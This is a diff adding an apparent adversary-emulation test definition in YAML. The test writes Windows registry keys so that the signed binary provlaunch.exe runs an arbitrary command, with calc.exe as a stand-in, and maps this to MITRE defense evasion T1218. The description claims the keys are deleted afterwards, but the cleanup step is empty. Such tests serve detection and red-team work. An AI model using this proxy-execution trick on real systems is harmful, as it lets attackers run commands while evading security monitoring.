@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Provlaunch.exe Executes Arbitrary Command via Registry Key
+description: |
+    Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.
+    - https://twitter.com/0gtweet/status/1674399582162153472
+    - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
+    Registry keys are deleted after successful execution.
+uuid: ab76e34f-28bf-441f-a39c-8db4835b89cc
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: provlaunch.exe-executes-arbitrary-command-via-registry-key
+      inline: |
+        reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
+        reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
+        c:\windows\system32\provlaunch.exe LOLBin
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
